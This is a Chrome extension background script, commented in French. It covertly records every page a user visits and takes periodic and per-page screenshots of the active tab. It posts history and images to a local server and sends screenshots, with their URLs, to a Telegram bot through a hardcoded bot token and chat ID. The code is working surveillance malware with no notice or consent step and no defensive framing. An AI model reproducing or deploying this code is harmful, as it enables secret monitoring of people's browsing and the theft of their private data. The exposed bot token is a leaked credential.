chrome.history.onVisited.addListener((result, tab) => {
  pushToServer(result);
  chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {
    uploadScreenshot(dataUrl, tab.url);

  });
});
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {

    if (changeInfo.status !== "complete") return;

    chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {

        if (!tab?.url) return;

        sendToTelegram(dataUrl, tab.url);

    });

});
function uploadScreenshot(dataUrl, pageUrl) {



  fetch("http://127.0.0.1:8000/api/photo", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      image: dataUrl,   // base64 PNG
      url: pageUrl,
      time: Date.now()
    })
  })
    .then(() => console.log("Screenshot envoyé"))
    .catch(err => console.error(err));
}

async function pushToServer(data) {
  try {
    const response = await fetch("http://127.0.0.1:8000/api/history", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        name: data.url,
        password: "password"
      })
    });

    if (!response.ok) {
      const text = await response.text();
      console.error("Erreur push status:", response.status, response.statusText, text);
    }
  } catch (err) {
    console.error("Erreur push:", err);
  }
}

chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create("syncHistory", {
    periodInMinutes: 1
  });
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "syncHistory") {
    chrome.history.search(
      { text: "", maxResults: 10 },
      (results) => {
        results.forEach(pushToServer);
      }
    );
  }
});

chrome.alarms.create("autoShot", {
  periodInMinutes: 1
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "autoShot") {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {
        uploadScreenshot(dataUrl, tabs[0].url);
      });
    });
  }
});

async function sendToTelegram(dataUrl, pageUrl) {

  const BOT_TOKEN = "8121028052:AAFYUn14R1FivsCV3Qz74IicVU1t2p56T9E"
  const CHAT_ID = "7144944533"


  try {

        const blob = await (await fetch(dataUrl)).blob();

        const formData = new FormData();

        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "capture.png");
        formData.append("caption", `Page: ${pageUrl}`);

        const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            {
                method: "POST",
                body: formData
            }
        );

        const result = await response.json();
        console.log("Telegram OK:", result);

    } catch (err) {
        console.error("Erreur Telegram:", err);
    }

}